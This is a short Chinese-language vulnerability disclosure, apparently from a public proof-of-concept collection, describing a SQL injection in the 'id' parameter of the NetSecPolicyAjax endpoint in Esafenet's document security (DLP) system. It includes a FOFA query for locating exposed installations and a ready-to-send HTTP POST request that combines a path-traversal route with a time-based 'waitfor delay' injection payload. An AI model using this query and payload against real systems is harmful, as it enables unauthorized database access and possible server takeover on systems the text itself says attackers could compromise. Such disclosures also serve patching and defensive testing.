# 亿赛通电子文档安全管理系统NetSecPolicyAjax存在SQL注入漏洞

亿某通电子文档安全管理系统` NetSecPolicyAjax`接口的`id`参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限

## fofa

```yaml
app="亿赛通-DLP"
```

## poc

```javascript
POST /CDGServer3/js/../NetSecPolicyAjax HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=upPriority&id=-1'waitfor delay '0:0:5'--
```

